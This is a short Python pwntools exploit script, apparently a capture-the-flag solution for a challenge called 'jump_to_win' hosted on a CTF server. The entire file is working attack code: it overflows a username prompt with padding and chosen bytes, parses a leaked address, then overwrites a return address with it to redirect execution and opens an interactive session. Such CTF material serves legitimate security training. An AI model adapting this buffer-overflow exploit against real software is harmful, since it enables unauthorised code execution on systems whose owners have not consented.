#!/usr/bin/env python3

from pwn import *

exe = ELF("jump_to_win")

context.binary = exe

# Payload elements
padding1 = "a" * 64
padding2 = "a" * 40
flag = "\x55\x41"

def conn():
	if False:
		r = process([exe.path])
	else:
		r = remote("ctf-metared-2021.ua.pt", 28307)

	return r

def main():
	r = conn()
	r.recvuntil("username:")
	r.sendline(padding1 + flag)
	r.recvuntil("successful == ")
	r.recvline()
	vuln = int(r.recvline()[18:-1], 0)
	r.recvuntil("advance:")
	r.sendline(bytes(padding2, 'utf-8') + p64(vuln))
	r.interactive()

if __name__ == "__main__":
	main()
